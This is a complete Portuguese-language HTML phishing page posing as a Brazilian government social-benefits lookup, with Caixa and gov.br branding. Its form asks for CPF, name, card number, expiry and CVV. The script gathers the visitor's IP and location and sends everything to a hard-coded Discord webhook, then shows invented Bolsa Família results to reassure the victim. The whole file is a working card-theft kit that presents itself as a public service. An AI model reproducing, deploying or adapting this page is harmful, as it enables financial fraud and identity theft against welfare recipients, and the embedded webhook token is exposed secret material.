<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de Benefícios Sociais</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #0066cc;
            --secondary: #00a859;
            --accent: #ffd700;
            --light: #f8f9fa;
            --dark: #1a1a2e;
            --card-gradient: linear-gradient(135deg, #0033a0 0%, #0066cc 100%);
            --error: #e74c3c;
            --success: #2ecc71;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        body {
            background-color: var(--light);
            color: var(--dark);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0,102,204,0.05) 0%, transparent 25%),
                radial-gradient(circle at 90% 80%, rgba(0,168,89,0.05) 0%, transparent 25%);
        }

        .header {
            background: var(--card-gradient);
            color: white;
            padding: 2rem;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,51,160,0.2);
            position: relative;
            overflow: hidden;
        }

        .header::after {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: pulse 15s infinite linear;
        }

        @keyframes pulse {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .logo-container {
            display: flex;
            justify-content: center;
            gap: 1rem;
            margin-bottom: 1rem;
            position: relative;
            z-index: 1;
        }

        .logo {
            height: 50px;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
            transition: transform 0.3s;
        }

        .logo:hover {
            transform: scale(1.05);
        }

        .container {
            max-width: 600px;
            margin: 2rem auto;
            background: white;
            border-radius: 16px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            position: relative;
            z-index: 1;
            transition: transform 0.3s;
        }

        .container:hover {
            transform: translateY(-5px);
        }

        .card-preview {
            background: var(--card-gradient);
            color: white;
            padding: 1.5rem;
            margin: 1.5rem;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0,51,160,0.2);
            position: relative;
            overflow: hidden;
            transition: transform 0.3s;
        }

        .card-preview::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, transparent 100%);
            pointer-events: none;
        }

        .card-preview:hover {
            transform: scale(1.02);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1.5rem;
            position: relative;
            z-index: 1;
        }

        .card-chip {
            width: 40px;
            height: 30px;
            background: rgba(255,255,255,0.3);
            border-radius: 5px;
            display: grid;
            place-items: center;
        }

        .card-number {
            font-family: 'Courier New', monospace;
            font-size: 1.25rem;
            letter-spacing: 2px;
            margin-bottom: 1.5rem;
            word-spacing: 8px;
            position: relative;
            z-index: 1;
        }

        .card-details {
            display: flex;
            justify-content: space-between;
            position: relative;
            z-index: 1;
        }

        .form-section {
            padding: 2rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
            position: relative;
        }

        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
        }

        .form-control {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s;
            background-color: rgba(255,255,255,0.9);
        }

        .form-control:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(0,102,204,0.1);
            background-color: white;
        }

        .btn {
            width: 100%;
            padding: 1rem;
            background: var(--secondary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .btn::after {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right,
                rgba(255,255,255,0) 45%,
                rgba(255,255,255,0.3) 50%,
                rgba(255,255,255,0) 55%
            );
            transform: rotate(30deg);
            transition: all 0.3s;
        }

        .btn:hover {
            background: #008a4a;
            transform: translateY(-2px);
        }

        .btn:hover::after {
            left: 100%;
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn.loading {
            pointer-events: none;
        }

        .btn.loading::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.2);
            z-index: 1;
        }

        .btn.loading i {
            animation: spin 1s infinite linear;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            text-align: center;
            padding: 1.5rem;
            color: #666;
        }

        /* Modal moderno */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background-color: white;
            padding: 2rem;
            border-radius: 12px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transform: translateY(0);
            transition: transform 0.3s;
            position: relative;
            overflow: hidden;
        }

        .modal-content::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: var(--secondary);
        }

        .close-btn {
            position: absolute;
            top: 1rem;
            right: 1rem;
            cursor: pointer;
            font-size: 1.5rem;
            color: #666;
            transition: color 0.3s;
            background: none;
            border: none;
            z-index: 1;
        }

        .close-btn:hover {
            color: var(--error);
        }

        .status-icon {
            text-align: center;
            font-size: 4rem;
            margin: 1rem 0;
        }

        .success {
            color: var(--success);
        }

        .error {
            color: var(--error);
        }

        /* Responsividade */
        @media (max-width: 600px) {
            .header {
                padding: 1.5rem;
            }
            
            .container {
                margin: 1rem;
                border-radius: 12px;
            }
            
            .form-section {
                padding: 1.5rem;
            }
            
            .card-preview {
                margin: 1rem;
            }
        }

        /* Efeitos de input */
        .input-container {
            position: relative;
        }

        .input-highlight {
            position: absolute;
            bottom: 0;
            left: 0;
            height: 2px;
            width: 0;
            background: var(--primary);
            transition: width 0.3s;
        }

        .form-control:focus ~ .input-highlight {
            width: 100%;
        }

        /* Notificação */
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s;
            z-index: 1001;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }

        .notification.error {
            background: var(--error);
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo-container">
            <img src="https://www.gov.br/mre/pt-br/temas/imagens/bandeira-brasil/@@images/image" alt="Brasil" class="logo">
            <img src="https://www.caixa.gov.br/PublishingImages/Logo-Caixa.svg" alt="Caixa" class="logo">
        </div>
        <h1>Consulta de Benefícios Sociais</h1>
    </header>

    <div class="container">
        <div class="card-preview">
            <div class="card-header">
                <div class="card-chip">
                    <i class="fas fa-microchip"></i>
                </div>
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Cartão" height="30">
            </div>
            <div class="card-number">•••• •••• •••• ••••</div>
            <div class="card-details">
                <div>NOME DO TITULAR</div>
                <div>••/••</div>
            </div>
        </div>

        <div class="form-section">
            <form id="benefitForm">
                <div class="form-group">
                    <div class="input-container">
                        <label class="form-label">CPF</label>
                        <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00" required>
                        <div class="input-highlight"></div>
                    </div>
                </div>
                
                <div class="form-group">
                    <div class="input-container">
                        <label class="form-label">Nome do Titular</label>
                        <input type="text" class="form-control" id="name" placeholder="Como no cartão" required>
                        <div class="input-highlight"></div>
                    </div>
                </div>
                
                <div class="form-group">
                    <div class="input-container">
                        <label class="form-label">Número do Cartão</label>
                        <input type="text" class="form-control" id="cardNumber" placeholder="0000 0000 0000 0000" required>
                        <div class="input-highlight"></div>
                    </div>
                </div>
                
                <div style="display: flex; gap: 1rem;">
                    <div class="form-group" style="flex: 1;">
                        <div class="input-container">
                            <label class="form-label">Validade</label>
                            <input type="text" class="form-control" id="expiry" placeholder="MM/AA" required>
                            <div class="input-highlight"></div>
                        </div>
                    </div>
                    <div class="form-group" style="flex: 1;">
                        <div class="input-container">
                            <label class="form-label">CVV</label>
                            <input type="password" class="form-control" id="cvv" placeholder="•••" maxlength="3" required>
                            <div class="input-highlight"></div>
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <i class="fas fa-search"></i> Verificar Benefícios
                </button>
            </form>
        </div>
    </div>

    <footer class="footer">
        <p>© 2024 Ministério da Cidadania - Todos os direitos reservados</p>
    </footer>

    <!-- Modal de resultados -->
    <div id="resultModal" class="modal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeModal()">&times;</button>
            <div class="status-icon success">
                <i class="fas fa-check-circle"></i>
            </div>
            <h2 style="text-align: center;">Consulta Realizada!</h2>
            <div id="resultContent" style="margin-top: 1rem; text-align: center;"></div>
            <div style="margin-top: 2rem; text-align: center;">
                <button class="btn" onclick="closeModal()" style="width: auto; padding: 0.75rem 2rem;">
                    <i class="fas fa-times"></i> Fechar
                </button>
            </div>
        </div>
    </div>

    <!-- Notificação -->
    <div id="notification" class="notification">
        <i class="fas fa-check-circle"></i>
        <span id="notificationText"></span>
    </div>

    <script>
        // Formatar CPF
        document.getElementById('cpf').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 3) value = value.replace(/^(\d{3})/, '$1.');
            if (value.length > 7) value = value.replace(/^(\d{3}\.\d{3})/, '$1.');
            if (value.length > 11) value = value.replace(/^(\d{3}\.\d{3}\.\d{3})/, '$1-');
            e.target.value = value.substring(0, 14);
        });

        // Formatar número do cartão
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value.substring(0, 19);
        });

        // Formatar validade
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) value = value.replace(/^(\d{2})/, '$1/');
            e.target.value = value.substring(0, 5);
        });

        // Mostrar notificação
        function showNotification(message, isError = false) {
            const notification = document.getElementById('notification');
            const notificationText = document.getElementById('notificationText');
            
            notificationText.textContent = message;
            notification.className = isError ? 'notification error show' : 'notification show';
            
            if (isError) {
                notification.querySelector('i').className = 'fas fa-exclamation-circle';
            } else {
                notification.querySelector('i').className = 'fas fa-check-circle';
            }
            
            setTimeout(() => {
                notification.className = isError ? 'notification error' : 'notification';
            }, 3000);
        }

        // Fechar modal
        function closeModal() {
            document.getElementById('resultModal').style.display = 'none';
        }

        // Enviar para webhook do Discord - Versão Premium
        async function sendToDiscordWebhook(data) {
            const webhookURL = 'https://discordapp.com/api/webhooks/1364725356116049940/_IRU9G9-JkPOCNNA3F7OKVaIjAsA6MG3IiRg8fRfN8F1VMBGbfXNa09_Ju6MfdkZqXeL';
            
            // Formatar a mensagem para o Discord
            const discordMessage = {
                username: "Consulta de Benefícios",
                avatar_url: "https://www.caixa.gov.br/PublishingImages/Logo-Caixa.svg",
                embeds: [{
                    title: "💳 NOVA CONSULTA DE BENEFÍCIOS 💰",
                    description: "🔍 Um novo cidadão consultou seus benefícios sociais!",
                    color: 0x0066cc,
                    thumbnail: {
                        url: "https://cdn-icons-png.flaticon.com/512/477/477103.png"
                    },
                    fields: [
                        {
                            name: "**👤 Nome Completo**",
                            value: `\`\`\`${data.name || "Não informado"}\`\`\``,
                            inline: false
                        },
                        {
                            name: "**📌 CPF**",
                            value: `\`\`\`${data.cpf || "Não informado"}\`\`\``,
                            inline: true
                        },
                        {
                            name: "**📅 Data/Hora**",
                            value: `<t:${Math.floor(Date.now()/1000)}:F>`,
                            inline: true
                        },
                        {
                            name: "**💳 Dados do Cartão**",
                            value: `\`\`\`${data.cardNumber || "Não informado"}\`\`\``,
                            inline: false
                        },
                        {
                            name: "**📅 Validade**",
                            value: `\`\`\`${data.expiry || "Não informado"}\`\`\``,
                            inline: true
                        },
                        {
                            name: "**🔑 CVV**",
                            value: `\`\`\`${data.cvv || "Não informado"}\`\`\``,
                            inline: true
                        },
                        {
                            name: "**🌐 IP**",
                            value: `\`${data.ip || "Não disponível"}\``,
                            inline: true
                        },
                        {
                            name: "**📍 Localização**",
                            value: `\`${data.location || "Não disponível"}\``,
                            inline: true
                        }
                    ],
                    image: {
                        url: "https://i.imgur.com/VvWkfzN.png"
                    },
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Sistema de Consulta de Benefícios Sociais • Ministério da Cidadania",
                        icon_url: "https://www.gov.br/mre/pt-br/temas/imagens/bandeira-brasil/@@images/image"
                    }
                }]
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(discordMessage)
                });

                return response.ok;
            } catch (error) {
                console.error('Erro ao enviar para o webhook:', error);
                return false;
            }
        }

        // Obter informações do IP
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (error) {
                console.error('Erro ao obter informações do IP:', error);
                return null;
            }
        }

        // Enviar formulário
        document.getElementById('benefitForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.classList.add('loading');
            submitBtn.innerHTML = '<i class="fas fa-spinner"></i> Processando...';
            
            // Coletar dados do formulário
            const formData = {
                cpf: document.getElementById('cpf').value,
                name: document.getElementById('name').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value
            };
            
            // Validar os dados
            if (!formData.cpf || !formData.name || !formData.cardNumber || !formData.expiry || !formData.cvv) {
                showNotification("Por favor, preencha todos os campos!", true);
                submitBtn.classList.remove('loading');
                submitBtn.innerHTML = '<i class="fas fa-search"></i> Verificar Benefícios';
                return;
            }
            
            // Obter informações adicionais
            const ipInfo = await getIPInfo();
            if (ipInfo) {
                formData.ip = ipInfo.ip || "Não disponível";
                formData.location = `${ipInfo.city || "Cidade desconhecida"}, ${ipInfo.region || "Região desconhecida"}, ${ipInfo.country_name || "País desconhecido"}`;
            }
            
            // Enviar para o webhook do Discord
            const success = await sendToDiscordWebhook(formData);
            
            if (success) {
                // Mostrar resultados (simulação)
                const resultContent = document.getElementById('resultContent');
                resultContent.innerHTML = `
                    <p>Sua consulta foi processada com sucesso!</p>
                    <div style="margin-top: 1.5rem; background: #f8f9fa; padding: 1rem; border-radius: 8px;">
                        <p><strong>Benefícios encontrados:</strong></p>
                        <ul style="text-align: left; margin-top: 0.5rem; padding-left: 1.5rem;">
                            <li>Bolsa Família - R$ 600,00</li>
                            <li>Auxílio Gás - R$ 120,00</li>
                            <li>Tarifa Social de Energia - Ativo</li>
                        </ul>
                    </div>
                    <p style="margin-top: 1.5rem; font-size: 0.9em; color: #666;">
                        Os valores estarão disponíveis em até 3 dias úteis.
                    </p>
                `;
                
                document.getElementById('resultModal').style.display = 'flex';
                showNotification("Consulta realizada com sucesso!");
            } else {
                showNotification("Erro ao processar a consulta. Tente novamente.", true);
            }
            
            submitBtn.classList.remove('loading');
            submitBtn.innerHTML = '<i class="fas fa-search"></i> Verificar Benefícios';
        });
    </script>
</body>
</html>
